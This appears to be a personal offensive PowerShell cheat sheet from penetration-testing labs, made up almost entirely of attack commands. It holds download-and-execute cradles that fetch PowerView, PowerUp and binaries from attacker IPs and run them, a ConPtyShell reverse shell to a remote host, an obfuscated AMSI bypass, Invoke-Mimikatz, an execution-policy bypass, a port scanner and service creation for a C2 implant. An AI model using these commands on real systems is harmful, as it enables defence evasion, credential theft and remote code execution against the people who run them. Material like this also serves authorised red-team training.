* https://github.com/samratashok/nishang

```
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -ep bypass
```

* PS-Run with output
```
& .\hidden-test.exe 2>&1
```
* from ps-shell
```
Start-Process notepad.exe
```

## PSRemoting
```
Enter-PSSession -ComputerName WS05.RASTALABS.LOCAL -Credential RASTALABS.LOCAL\NGODFREY
```
```
(new-object system.net.webclient).downloadstring('http://192.168.99.2/powerview.ps1') | IEX
invoke-webrequest http://10.10.16.29:8080/dazzleUP.exe -outfile dazzleUP.exe
invoke-webrequest http://10.10.16.14:8080/hidden-test.exe -outfile C:\windows\temp\test.exe
```
## Port Scan
```
80,8080,445,139,135,3389,1433,5985,47001 | % {echo ((new-object Net.Sockets.TcpClient).Connect(“10.10.16.29”,$_)) “Port $_ is open!”} 2>$null
```

## Test AV
```
Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
Invoke-Mimikatz
```
## Create service
```
New-Service -Name "gruntsvc" -BinaryPathName '"C:\WINDOWS\System32\svchost.exe -k netsvcs"'
Start-Service -Name 'gruntsvc'
Stop-Service -Name 'gruntsvc'
Restart-Service -Name 'gruntsvc'
$service = Get-WmiObject -Class Win32_Service -Filter "Name='gruntsvc'"
$service.delete()
```

## read/write
```
IEX(Get-Content .\Invoke-ConPtyShell.ps1 -Raw); Invoke-ConPtyShell 10.0.0.2 3001
Get-Content -Path 'C:\Demo\test.txt' -Encoding Byte
```
```
$a = [IO.File]::ReadAllText("C:\Users\John\Desktop\test.txt")
[system.Convert]::toBase64string([System.text.encoding]::Unicode.getbytes($a))
```
```
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b))
[System.IO.File]::WriteAllText("Z:\backup\PTA\CRTE\tgt-sqladmin",$b)
```
```
$filename = "C:\tools\donut\loader.bin"
[system.Convert]::toBase64string([IO.File]::ReadAllBytes($filename)) | Clip
```


## AMSI
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

## PS -- need admin
```
Get-Process | Format-Table Id,Username,Name,si,FileName -AutoSize
```

## Applocker
```
$ExecutionContext.SessionState.LanguageMode
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

## From service name to display name
```
powerpick Get-Service –Name "MSSQL*"
```
## DownloadExec
```
((New-Object Net.WebClient).DownloadString('http://10.10.16.29:8080/PowerUp.ps1')) | iex 
((New-Object Net.WebClient).DownloadString('http://10.10.16.29:8080/PowerUpSQL.ps1')) | iex 
((New-Object Net.WebClient).DownloadString('http://10.10.16.29:8080/Find-PSRemotingLocalAdminAccess.ps1')) | iex 
```

## Net Version
```
get-childitem -path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP"
```

## Formating
```
Format-List *
```

## which
```
get-command
```

## if x64
```
[Environment]::Is64BitProcess
```

